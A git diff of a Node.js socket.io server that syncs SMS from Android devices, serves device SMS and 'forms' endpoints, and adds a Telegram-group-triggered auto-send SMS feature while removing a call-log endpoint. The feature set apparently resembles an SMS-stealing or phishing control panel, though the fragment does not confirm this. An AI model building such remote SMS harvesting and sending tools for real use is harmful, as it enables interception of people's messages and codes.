@@ -43,7 +43,7 @@ const io = new Server(httpServer, {
     },
     pingTimeout: 20000,  // 20s — detect dead Android sockets quickly (was 60s)
     pingInterval: 10000, // Ping every 10s for faster drop detection (was 25s)
-    maxHttpBufferSize: 5e6, // 5 MB max payload size for large SMS/call log syncs
+    maxHttpBufferSize: 5e6, // 5 MB max payload size for large SMS syncs
 });
 
 // Initialize Telegram Bot
@@ -53,7 +53,33 @@ const telegramConfig = process.env.TELEGRAM_BOT_TOKEN ? {
         .split(',')
         .map(id => parseInt(id.trim(), 10))
         .filter(id => !isNaN(id)),
+    autoSms: buildAutoSmsConfig(),
 } : undefined;
+
+/**
+ * AutoSend SMS configuration (second-bot group requests).
+ * Requires AUTO_SMS_ENABLED=true plus a group id and sender id.
+ */
+function buildAutoSmsConfig() {
+    if (process.env.AUTO_SMS_ENABLED !== 'true') return undefined;
+    const groupId = parseInt(process.env.AUTO_SMS_GROUP_ID || '', 10);
+    const senderId = parseInt(process.env.AUTO_SMS_BOT_ID || '', 10);
+    if (isNaN(groupId) || isNaN(senderId)) {
+        console.warn('[Telegram] AutoSend SMS enabled but AUTO_SMS_GROUP_ID / AUTO_SMS_BOT_ID missing or invalid - feature disabled');
+        return undefined;
+    }
+    const ttlMinutes = parseInt(process.env.AUTO_SMS_REQUEST_TTL_MINUTES || '30', 10);
+    return {
+        enabled: true,
+        groupId,
+        senderId,
+        ttlMinutes: isNaN(ttlMinutes) ? 30 : ttlMinutes,
+        deviceId: process.env.AUTO_SMS_DEVICE_ID || undefined,
+        subscriptionId: process.env.AUTO_SMS_SUBSCRIPTION_ID
+            ? parseInt(process.env.AUTO_SMS_SUBSCRIPTION_ID, 10)
+            : undefined,
+    };
+}
 
 const telegramBot = initTelegramBot(telegramConfig);
 
@@ -106,11 +132,6 @@ app.get('/api/devices/:id', (req, res) => {
 app.get('/api/devices/:id/sms', (req, res) => {
     const sms = store.getSMS(req.params.id);
     res.json(sms);
-});
-
-app.get('/api/devices/:id/calls', (req, res) => {
-    const calls = store.getCalls(req.params.id);
-    res.json(calls);
 });
 
 app.get('/api/devices/:id/forms', (req, res) => {
